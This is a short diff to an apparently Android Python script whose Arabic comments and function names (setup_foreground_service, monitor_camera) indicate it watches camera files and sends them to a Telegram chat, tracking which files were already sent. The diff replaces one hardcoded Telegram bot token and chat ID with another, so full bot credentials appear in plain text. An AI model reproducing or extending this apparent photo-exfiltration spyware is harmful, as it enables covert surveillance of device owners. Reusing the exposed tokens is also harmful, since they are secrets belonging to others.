@@ -4,8 +4,8 @@ import requests
 from jnius import autoclass
 
 # --- إعدادات التلجرام ---
-TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
-CHAT_ID = "-1003535367279"
+TOKEN = "8245015472:AAGM1IVI7CfGZWx8uT5faVLnxaHaaoTvFYs"
+CHAT_ID = "-5275060177"
 
 # مجموعة لتخزين الملفات التي تم إرسالها لمنع التكرار
 sent_files = set()
@@ -100,3 +100,4 @@ def monitor_camera():
 if __name__ == '__main__':
     setup_foreground_service()
     monitor_camera()
+
